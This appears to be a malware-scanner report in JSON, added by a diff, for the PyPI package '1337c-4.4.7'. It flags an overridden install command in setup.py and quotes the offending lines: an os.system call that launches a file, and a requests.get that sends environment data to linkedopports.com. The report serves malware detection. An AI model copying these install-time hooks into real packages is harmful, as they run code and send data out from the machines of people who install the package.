@@ -1,0 +1,37 @@
+{
+    "package": "./packages_pypi/1337c-4.4.7",
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "silent-process-execution": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:26",
+                "code": "setup(\n  name='1337c',\n  version='4.4.7',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "obfuscation": {},
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "shady-links": {},
+        "code-execution": [
+            {
+                "location": "setup.py:16",
+                "code": "            os.system('start '+filename)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:10",
+                "code": "        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "steganography": {}
+    },
+    "path": "./packages_pypi/1337c-4.4.7"
+}
